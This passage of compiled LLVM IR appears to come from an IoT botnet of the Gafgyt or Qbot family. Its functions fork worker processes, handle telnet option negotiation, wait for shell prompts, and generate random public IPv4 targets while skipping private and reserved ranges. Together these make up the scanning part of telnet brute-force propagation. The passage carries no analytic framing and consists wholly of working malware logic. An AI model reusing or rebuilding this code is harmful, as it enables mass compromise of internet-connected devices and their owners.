  store i32 0, i32* %5, align 4
  br label %106

96:                                               ; preds = %94
  br label %97

97:                                               ; preds = %96, %37
  %98 = load i32, i32* %6, align 4
  %99 = call i32 (i32, i32, ...) @fcntl(i32 %98, i32 3, i8* null)
  %100 = sext i32 %99 to i64
  store i64 %100, i64* %15, align 8
  %101 = load i64, i64* %15, align 8
  %102 = and i64 %101, -2049
  store i64 %102, i64* %15, align 8
  %103 = load i32, i32* %6, align 4
  %104 = load i64, i64* %15, align 8
  %105 = call i32 (i32, i32, ...) @fcntl(i32 %103, i32 4, i64 %104)
  store i32 1, i32* %5, align 4
  br label %106

106:                                              ; preds = %97, %95, %93, %91, %36
  %107 = load i32, i32* %5, align 4
  ret i32 %107
}

declare i32 @fcntl(i32, i32, ...) #5

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @htons(i16 zeroext) #8

declare i32 @connect(i32, %struct.sockaddr*, i32) #5

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @listFork() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #12
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  %7 = icmp ule i32 %6, 0
  br i1 %7, label %8, label %10

8:                                                ; preds = %0
  %9 = load i32, i32* %2, align 4
  store i32 %9, i32* %1, align 4
  br label %47

10:                                               ; preds = %0
  %11 = load i64, i64* @numpids, align 8
  %12 = add i64 %11, 1
  store i64 %12, i64* @numpids, align 8
  %13 = load i64, i64* @numpids, align 8
  %14 = add i64 %13, 1
  %15 = mul i64 %14, 4
  %16 = call noalias align 16 i8* @malloc(i64 %15) #12
  %17 = bitcast i8* %16 to i32*
  store i32* %17, i32** %3, align 8
  store i32 0, i32* %4, align 4
  br label %18

18:                                               ; preds = %34, %10
  %19 = load i32, i32* %4, align 4
  %20 = zext i32 %19 to i64
  %21 = load i64, i64* @numpids, align 8
  %22 = sub i64 %21, 1
  %23 = icmp ult i64 %20, %22
  br i1 %23, label %24, label %37

24:                                               ; preds = %18
  %25 = load i32*, i32** @pids, align 8
  %26 = load i32, i32* %4, align 4
  %27 = zext i32 %26 to i64
  %28 = getelementptr inbounds i32, i32* %25, i64 %27
  %29 = load i32, i32* %28, align 4
  %30 = load i32*, i32** %3, align 8
  %31 = load i32, i32* %4, align 4
  %32 = zext i32 %31 to i64
  %33 = getelementptr inbounds i32, i32* %30, i64 %32
  store i32 %29, i32* %33, align 4
  br label %34

34:                                               ; preds = %24
  %35 = load i32, i32* %4, align 4
  %36 = add i32 %35, 1
  store i32 %36, i32* %4, align 4
  br label %18, !llvm.loop !32

37:                                               ; preds = %18
  %38 = load i32, i32* %2, align 4
  %39 = load i32*, i32** %3, align 8
  %40 = load i64, i64* @numpids, align 8
  %41 = sub i64 %40, 1
  %42 = getelementptr inbounds i32, i32* %39, i64 %41
  store i32 %38, i32* %42, align 4
  %43 = load i32*, i32** @pids, align 8
  %44 = bitcast i32* %43 to i8*
  call void @free(i8* %44) #12
  %45 = load i32*, i32** %3, align 8
  store i32* %45, i32** @pids, align 8
  %46 = load i32, i32* %2, align 4
  store i32 %46, i32* %1, align 4
  br label %47

47:                                               ; preds = %37, %8
  %48 = load i32, i32* %1, align 4
  ret i32 %48
}

; Function Attrs: nounwind
declare i32 @fork() #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @negotiate(i32 %0, i8* %1, i32 %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %9 = load i8*, i8** %6, align 8
  %10 = getelementptr inbounds i8, i8* %9, i64 1
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  switch i32 %12, label %63 [
    i32 255, label %13
    i32 251, label %14
    i32 252, label %14
    i32 253, label %14
    i32 254, label %14
  ]

13:                                               ; preds = %3
  store i32 0, i32* %4, align 4
  br label %65

14:                                               ; preds = %3, %3, %3, %3
  store i8 -1, i8* %8, align 1
  %15 = load i32, i32* %5, align 4
  %16 = call i64 @send(i32 %15, i8* %8, i64 1, i32 16384)
  %17 = load i8*, i8** %6, align 8
  %18 = getelementptr inbounds i8, i8* %17, i64 1
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 252, %20
  br i1 %21, label %22, label %23

22:                                               ; preds = %14
  store i8 -2, i8* %8, align 1
  br label %56

23:                                               ; preds = %14
  %24 = load i8*, i8** %6, align 8
  %25 = getelementptr inbounds i8, i8* %24, i64 1
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 254, %27
  br i1 %28, label %29, label %30

29:                                               ; preds = %23
  store i8 -4, i8* %8, align 1
  br label %55

30:                                               ; preds = %23
  %31 = load i8*, i8** %6, align 8
  %32 = getelementptr inbounds i8, i8* %31, i64 1
  %33 = load i8, i8* %32, align 1
  %34 = zext i8 %33 to i32
  %35 = icmp eq i32 3, %34
  br i1 %35, label %36, label %45

36:                                               ; preds = %30
  %37 = load i8*, i8** %6, align 8
  %38 = getelementptr inbounds i8, i8* %37, i64 1
  %39 = load i8, i8* %38, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp eq i32 %40, 253
  %42 = zext i1 %41 to i64
  %43 = select i1 %41, i32 251, i32 253
  %44 = trunc i32 %43 to i8
  store i8 %44, i8* %8, align 1
  br label %54

45:                                               ; preds = %30
  %46 = load i8*, i8** %6, align 8
  %47 = getelementptr inbounds i8, i8* %46, i64 1
  %48 = load i8, i8* %47, align 1
  %49 = zext i8 %48 to i32
  %50 = icmp eq i32 %49, 253
  %51 = zext i1 %50 to i64
  %52 = select i1 %50, i32 252, i32 254
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* %8, align 1
  br label %54

54:                                               ; preds = %45, %36
  br label %55

55:                                               ; preds = %54, %29
  br label %56

56:                                               ; preds = %55, %22
  %57 = load i32, i32* %5, align 4
  %58 = call i64 @send(i32 %57, i8* %8, i64 1, i32 16384)
  %59 = load i32, i32* %5, align 4
  %60 = load i8*, i8** %6, align 8
  %61 = getelementptr inbounds i8, i8* %60, i64 2
  %62 = call i64 @send(i32 %59, i8* %61, i64 1, i32 16384)
  br label %64

63:                                               ; preds = %3
  br label %64

64:                                               ; preds = %63, %56
  store i32 0, i32* %4, align 4
  br label %65

65:                                               ; preds = %64, %13
  %66 = load i32, i32* %4, align 4
  ret i32 %66
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @matchPrompt(i8* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.23, i64 0, i64 0), i8** %4, align 8
  %8 = load i8*, i8** %3, align 8
  %9 = call i64 @strlen(i8* %8) #11
  %10 = trunc i64 %9 to i32
  store i32 %10, i32* %5, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %11

11:                                               ; preds = %97, %1
  %12 = load i32, i32* %6, align 4
  %13 = sext i32 %12 to i64
  %14 = load i8*, i8** %4, align 8
  %15 = call i64 @strlen(i8* %14) #11
  %16 = icmp ult i64 %13, %15
  br i1 %16, label %17, label %100

17:                                               ; preds = %11
  br label %18

18:                                               ; preds = %74, %17
  %19 = load i32, i32* %5, align 4
  %20 = load i32, i32* %7, align 4
  %21 = icmp sgt i32 %19, %20
  br i1 %21, label %22, label %72

22:                                               ; preds = %18
  %23 = load i8*, i8** %3, align 8
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds i8, i8* %23, i64 %25
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = sub i64 0, %28
  %30 = getelementptr inbounds i8, i8* %26, i64 %29
  %31 = load i8, i8* %30, align 1
  %32 = sext i8 %31 to i32
  %33 = icmp eq i32 %32, 0
  br i1 %33, label %70, label %34

34:                                               ; preds = %22
  %35 = load i8*, i8** %3, align 8
  %36 = load i32, i32* %5, align 4
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds i8, i8* %35, i64 %37
  %39 = load i32, i32* %7, align 4
  %40 = sext i32 %39 to i64
  %41 = sub i64 0, %40
  %42 = getelementptr inbounds i8, i8* %38, i64 %41
  %43 = load i8, i8* %42, align 1
  %44 = sext i8 %43 to i32
  %45 = icmp eq i32 %44, 32
  br i1 %45, label %70, label %46

46:                                               ; preds = %34
  %47 = load i8*, i8** %3, align 8
  %48 = load i32, i32* %5, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds i8, i8* %47, i64 %49
  %51 = load i32, i32* %7, align 4
  %52 = sext i32 %51 to i64
  %53 = sub i64 0, %52
  %54 = getelementptr inbounds i8, i8* %50, i64 %53
  %55 = load i8, i8* %54, align 1
  %56 = sext i8 %55 to i32
  %57 = icmp eq i32 %56, 13
  br i1 %57, label %70, label %58

58:                                               ; preds = %46
  %59 = load i8*, i8** %3, align 8
  %60 = load i32, i32* %5, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds i8, i8* %59, i64 %61
  %63 = load i32, i32* %7, align 4
  %64 = sext i32 %63 to i64
  %65 = sub i64 0, %64
  %66 = getelementptr inbounds i8, i8* %62, i64 %65
  %67 = load i8, i8* %66, align 1
  %68 = sext i8 %67 to i32
  %69 = icmp eq i32 %68, 10
  br label %70

70:                                               ; preds = %58, %46, %34, %22
  %71 = phi i1 [ true, %46 ], [ true, %34 ], [ true, %22 ], [ %69, %58 ]
  br label %72

72:                                               ; preds = %70, %18
  %73 = phi i1 [ false, %18 ], [ %71, %70 ]
  br i1 %73, label %74, label %77

74:                                               ; preds = %72
  %75 = load i32, i32* %7, align 4
  %76 = add nsw i32 %75, 1
  store i32 %76, i32* %7, align 4
  br label %18, !llvm.loop !33

77:                                               ; preds = %72
  %78 = load i8*, i8** %3, align 8
  %79 = load i32, i32* %5, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds i8, i8* %78, i64 %80
  %82 = load i32, i32* %7, align 4
  %83 = sext i32 %82 to i64
  %84 = sub i64 0, %83
  %85 = getelementptr inbounds i8, i8* %81, i64 %84
  %86 = load i8, i8* %85, align 1
  %87 = sext i8 %86 to i32
  %88 = load i8*, i8** %4, align 8
  %89 = load i32, i32* %6, align 4
  %90 = sext i32 %89 to i64
  %91 = getelementptr inbounds i8, i8* %88, i64 %90
  %92 = load i8, i8* %91, align 1
  %93 = sext i8 %92 to i32
  %94 = icmp eq i32 %87, %93
  br i1 %94, label %95, label %96

95:                                               ; preds = %77
  store i32 1, i32* %2, align 4
  br label %101

96:                                               ; preds = %77
  br label %97

97:                                               ; preds = %96
  %98 = load i32, i32* %6, align 4
  %99 = add nsw i32 %98, 1
  store i32 %99, i32* %6, align 4
  br label %11, !llvm.loop !34

100:                                              ; preds = %11
  store i32 0, i32* %2, align 4
  br label %101

101:                                              ; preds = %100, %95
  %102 = load i32, i32* %2, align 4
  ret i32 %102
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @readUntil(i32 %0, i8* %1, i32 %2, i32 %3, i32 %4, i8* %5, i32 %6, i32 %7) #0 {
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca %struct.fd_set, align 8
  %22 = alloca %struct.timeval, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca %struct.fd_set*, align 8
  store i32 %0, i32* %10, align 4
  store i8* %1, i8** %11, align 8
  store i32 %2, i32* %12, align 4
  store i32 %3, i32* %13, align 4
  store i32 %4, i32* %14, align 4
  store i8* %5, i8** %15, align 8
  store i32 %6, i32* %16, align 4
  store i32 %7, i32* %17, align 4
  %26 = load i32, i32* %17, align 4
  store i32 %26, i32* %18, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %27 = load i32, i32* %13, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  store i64 %28, i64* %29, align 8
  %30 = load i32, i32* %14, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  store i64 %31, i64* %32, align 8
  store i8* null, i8** %23, align 8
  br label %33

33:                                               ; preds = %142, %8
  %34 = load i32, i32* %18, align 4
  %35 = add nsw i32 %34, 2
  %36 = load i32, i32* %16, align 4
  %37 = icmp slt i32 %35, %36
  br i1 %37, label %38, label %48

38:                                               ; preds = %33
  %39 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  %40 = load i64, i64* %39, align 8
  %41 = icmp sgt i64 %40, 0
  br i1 %41, label %46, label %42

42:                                               ; preds = %38
  %43 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  %44 = load i64, i64* %43, align 8
  %45 = icmp sgt i64 %44, 0
  br label %46

46:                                               ; preds = %42, %38
  %47 = phi i1 [ true, %38 ], [ %45, %42 ]
  br label %48

48:                                               ; preds = %46, %33
  %49 = phi i1 [ false, %33 ], [ %47, %46 ]
  br i1 %49, label %50, label %143

50:                                               ; preds = %48
  br label %51

51:                                               ; preds = %50
  store %struct.fd_set* %21, %struct.fd_set** %25, align 8
  store i32 0, i32* %24, align 4
  br label %52

52:                                               ; preds = %62, %51
  %53 = load i32, i32* %24, align 4
  %54 = zext i32 %53 to i64
  %55 = icmp ult i64 %54, 16
  br i1 %55, label %56, label %65

56:                                               ; preds = %52
  %57 = load %struct.fd_set*, %struct.fd_set** %25, align 8
  %58 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %57, i32 0, i32 0
  %59 = load i32, i32* %24, align 4
  %60 = zext i32 %59 to i64
  %61 = getelementptr inbounds [16 x i64], [16 x i64]* %58, i64 0, i64 %60
  store i64 0, i64* %61, align 8
  br label %62

62:                                               ; preds = %56
  %63 = load i32, i32* %24, align 4
  %64 = add i32 %63, 1
  store i32 %64, i32* %24, align 4
  br label %52, !llvm.loop !35

65:                                               ; preds = %52
  br label %66

66:                                               ; preds = %65
  %67 = load i32, i32* %10, align 4
  %68 = srem i32 %67, 64
  %69 = zext i32 %68 to i64
  %70 = shl i64 1, %69
  %71 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %72 = load i32, i32* %10, align 4
  %73 = sdiv i32 %72, 64
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds [16 x i64], [16 x i64]* %71, i64 0, i64 %74
  %76 = load i64, i64* %75, align 8
  %77 = or i64 %76, %70
  store i64 %77, i64* %75, align 8
  %78 = load i32, i32* %10, align 4
  %79 = add nsw i32 %78, 1
  %80 = call i32 @select(i32 %79, %struct.fd_set* %21, %struct.fd_set* null, %struct.fd_set* null, %struct.timeval* %22)
  %81 = icmp slt i32 %80, 1
  br i1 %81, label %82, label %83

82:                                               ; preds = %66
  br label %143

83:                                               ; preds = %66
  %84 = load i8*, i8** %15, align 8
  %85 = load i32, i32* %18, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds i8, i8* %84, i64 %86
  store i8* %87, i8** %23, align 8
  %88 = load i32, i32* %10, align 4
  %89 = load i8*, i8** %23, align 8
  %90 = call i64 @recv(i32 %88, i8* %89, i64 1, i32 0)
  %91 = trunc i64 %90 to i32
  store i32 %91, i32* %19, align 4
  %92 = load i32, i32* %19, align 4
  %93 = icmp eq i32 %92, -1
  br i1 %93, label %97, label %94

94:                                               ; preds = %83
  %95 = load i32, i32* %19, align 4
  %96 = icmp eq i32 %95, 0
  br i1 %96, label %97, label %98

97:                                               ; preds = %94, %83
  store i32 0, i32* %9, align 4
  br label %148

98:                                               ; preds = %94
  %99 = load i32, i32* %19, align 4
  %100 = load i32, i32* %18, align 4
  %101 = add nsw i32 %100, %99
  store i32 %101, i32* %18, align 4
  %102 = load i8*, i8** %23, align 8
  %103 = load i8, i8* %102, align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 255
  br i1 %105, label %106, label %128

106:                                              ; preds = %98
  %107 = load i32, i32* %10, align 4
  %108 = load i8*, i8** %23, align 8
  %109 = getelementptr inbounds i8, i8* %108, i64 1
  %110 = call i64 @recv(i32 %107, i8* %109, i64 2, i32 0)
  %111 = trunc i64 %110 to i32
  store i32 %111, i32* %19, align 4
  %112 = load i32, i32* %19, align 4
  %113 = icmp eq i32 %112, -1
  br i1 %113, label %117, label %114

114:                                              ; preds = %106
  %115 = load i32, i32* %19, align 4
  %116 = icmp eq i32 %115, 0
  br i1 %116, label %117, label %118

117:                                              ; preds = %114, %106
  store i32 0, i32* %9, align 4
  br label %148

118:                                              ; preds = %114
  %119 = load i32, i32* %19, align 4
  %120 = load i32, i32* %18, align 4
  %121 = add nsw i32 %120, %119
  store i32 %121, i32* %18, align 4
  %122 = load i32, i32* %10, align 4
  %123 = load i8*, i8** %23, align 8
  %124 = call i32 @negotiate(i32 %122, i8* %123, i32 3)
  %125 = icmp ne i32 %124, 0
  br i1 %125, label %127, label %126

126:                                              ; preds = %118
  store i32 0, i32* %9, align 4
  br label %148

127:                                              ; preds = %118
  br label %142

128:                                              ; preds = %98
  %129 = load i8*, i8** %15, align 8
  %130 = load i8*, i8** %11, align 8
  %131 = call i8* @strstr(i8* %129, i8* %130) #11
  %132 = icmp ne i8* %131, null
  br i1 %132, label %140, label %133

133:                                              ; preds = %128
  %134 = load i32, i32* %12, align 4
  %135 = icmp ne i32 %134, 0
  br i1 %135, label %136, label %141

136:                                              ; preds = %133
  %137 = load i8*, i8** %15, align 8
  %138 = call i32 @matchPrompt(i8* %137)
  %139 = icmp ne i32 %138, 0
  br i1 %139, label %140, label %141

140:                                              ; preds = %136, %128
  store i32 1, i32* %20, align 4
  br label %143

141:                                              ; preds = %136, %133
  br label %142

142:                                              ; preds = %141, %127
  br label %33, !llvm.loop !36

143:                                              ; preds = %140, %82, %48
  %144 = load i32, i32* %20, align 4
  %145 = icmp ne i32 %144, 0
  br i1 %145, label %146, label %147

146:                                              ; preds = %143
  store i32 1, i32* %9, align 4
  br label %148

147:                                              ; preds = %143
  store i32 0, i32* %9, align 4
  br label %148

148:                                              ; preds = %147, %146, %126, %117, %97
  %149 = load i32, i32* %9, align 4
  ret i32 %149
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @getRandomPublicIP() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [16 x i8], align 16
  %3 = alloca [16 x i8], align 16
  %4 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %5 = zext i8 %4 to i32
  %6 = icmp sgt i32 %5, 0
  br i1 %6, label %7, label %27

7:                                                ; preds = %0
  %8 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %9 = zext i8 %8 to i32
  %10 = icmp slt i32 %9, 255
  br i1 %10, label %11, label %27

11:                                               ; preds = %7
  %12 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %13 = add i8 %12, 1
  store i8 %13, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %14 = bitcast [16 x i8]* %2 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %14, i8 0, i64 16, i1 false)
  %15 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i64 0, i64 0
  %16 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %17 = zext i8 %16 to i32
  %18 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %19 = zext i8 %18 to i32
  %20 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %21 = zext i8 %20 to i32
  %22 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %23 = zext i8 %22 to i32
  %24 = call i32 (i8*, i8*, ...) @szprintf(i8* %15, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.24, i64 0, i64 0), i32 %17, i32 %19, i32 %21, i32 %23)
  %25 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i64 0, i64 0
  %26 = call i32 @inet_addr(i8* %25) #12
  store i32 %26, i32* %1, align 4
  br label %177

27:                                               ; preds = %7, %0
  %28 = call i32 @rand() #12
  %29 = srem i32 %28, 255
  %30 = trunc i32 %29 to i8
  store i8 %30, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %31 = call i32 @rand() #12
  %32 = srem i32 %31, 255
  %33 = trunc i32 %32 to i8
  store i8 %33, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %34 = call i32 @rand() #12
  %35 = srem i32 %34, 255
  %36 = trunc i32 %35 to i8
  store i8 %36, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  store i8 0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  br label %37

37:                                               ; preds = %155, %27
  %38 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %39, 0
  br i1 %40, label %153, label %41

41:                                               ; preds = %37
  %42 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %43 = zext i8 %42 to i32
  %44 = icmp eq i32 %43, 10
  br i1 %44, label %153, label %45

45:                                               ; preds = %41
  %46 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %47 = zext i8 %46 to i32
  %48 = icmp eq i32 %47, 100
  br i1 %48, label %49, label %57

49:                                               ; preds = %45
  %50 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %51 = zext i8 %50 to i32
  %52 = icmp sge i32 %51, 64
  br i1 %52, label %53, label %57

53:                                               ; preds = %49
  %54 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %55 = zext i8 %54 to i32
  %56 = icmp sle i32 %55, 127
  br i1 %56, label %153, label %57

57:                                               ; preds = %53, %49, %45
  %58 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %59 = zext i8 %58 to i32
  %60 = icmp eq i32 %59, 127
  br i1 %60, label %153, label %61

61:                                               ; preds = %57
  %62 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %63 = zext i8 %62 to i32
  %64 = icmp eq i32 %63, 169
  br i1 %64, label %65, label %69

65:                                               ; preds = %61
  %66 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %67 = zext i8 %66 to i32
  %68 = icmp eq i32 %67, 254
  br i1 %68, label %153, label %69

69:                                               ; preds = %65, %61
  %70 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %71 = zext i8 %70 to i32
  %72 = icmp eq i32 %71, 172
  br i1 %72, label %73, label %81

73:                                               ; preds = %69
  %74 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %75 = zext i8 %74 to i32
  %76 = icmp sle i32 %75, 16
  br i1 %76, label %77, label %81

77:                                               ; preds = %73
  %78 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %79 = zext i8 %78 to i32
  %80 = icmp sle i32 %79, 31
  br i1 %80, label %153, label %81

81:                                               ; preds = %77, %73, %69
  %82 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %83 = zext i8 %82 to i32
  %84 = icmp eq i32 %83, 192
  br i1 %84, label %85, label %93

85:                                               ; preds = %81
  %86 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %87 = zext i8 %86 to i32
  %88 = icmp eq i32 %87, 0
  br i1 %88, label %89, label %93

89:                                               ; preds = %85
  %90 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %91 = zext i8 %90 to i32
  %92 = icmp eq i32 %91, 2
  br i1 %92, label %153, label %93

93:                                               ; preds = %89, %85, %81
  %94 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %95 = zext i8 %94 to i32
  %96 = icmp eq i32 %95, 192
  br i1 %96, label %97, label %105

97:                                               ; preds = %93
  %98 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %99 = zext i8 %98 to i32
  %100 = icmp eq i32 %99, 88
  br i1 %100, label %101, label %105

101:                                              ; preds = %97
  %102 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %103 = zext i8 %102 to i32
  %104 = icmp eq i32 %103, 99
  br i1 %104, label %153, label %105

105:                                              ; preds = %101, %97, %93
  %106 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %107 = zext i8 %106 to i32
  %108 = icmp eq i32 %107, 192
  br i1 %108, label %109, label %113

109:                                              ; preds = %105
  %110 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %111 = zext i8 %110 to i32
  %112 = icmp eq i32 %111, 168
  br i1 %112, label %153, label %113

113:                                              ; preds = %109, %105
  %114 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %115 = zext i8 %114 to i32
  %116 = icmp eq i32 %115, 198
  br i1 %116, label %117, label %125

117:                                              ; preds = %113
  %118 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %119 = zext i8 %118 to i32
  %120 = icmp eq i32 %119, 18
  br i1 %120, label %153, label %121

121:                                              ; preds = %117
  %122 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %123 = zext i8 %122 to i32
  %124 = icmp eq i32 %123, 19
  br i1 %124, label %153, label %125

125:                                              ; preds = %121, %113
  %126 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %127 = zext i8 %126 to i32
  %128 = icmp eq i32 %127, 198
  br i1 %128, label %129, label %137

129:                                              ; preds = %125
  %130 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %131 = zext i8 %130 to i32
  %132 = icmp eq i32 %131, 51
  br i1 %132, label %133, label %137

133:                                              ; preds = %129
  %134 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %135 = zext i8 %134 to i32
  %136 = icmp eq i32 %135, 100
  br i1 %136, label %153, label %137

137:                                              ; preds = %133, %129, %125
  %138 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %139 = zext i8 %138 to i32
  %140 = icmp eq i32 %139, 203
  br i1 %140, label %141, label %149

141:                                              ; preds = %137
  %142 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %143 = zext i8 %142 to i32
  %144 = icmp eq i32 %143, 0
  br i1 %144, label %145, label %149

145:                                              ; preds = %141
  %146 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %147 = zext i8 %146 to i32
  %148 = icmp eq i32 %147, 113
  br i1 %148, label %153, label %149

149:                                              ; preds = %145, %141, %137
  %150 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %151 = zext i8 %150 to i32
  %152 = icmp sge i32 %151, 224
  br label %153

153:                                              ; preds = %149, %145, %133, %121, %117, %109, %101, %89, %77, %65, %57, %53, %41, %37
  %154 = phi i1 [ true, %145 ], [ true, %133 ], [ true, %121 ], [ true, %117 ], [ true, %109 ], [ true, %101 ], [ true, %89 ], [ true, %77 ], [ true, %65 ], [ true, %57 ], [ true, %53 ], [ true, %41 ], [ true, %37 ], [ %152, %149 ]
  br i1 %154, label %155, label %165

155:                                              ; preds = %153
  %156 = call i32 @rand() #12
  %157 = srem i32 %156, 255
  %158 = trunc i32 %157 to i8
  store i8 %158, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %159 = call i32 @rand() #12
  %160 = srem i32 %159, 255
  %161 = trunc i32 %160 to i8
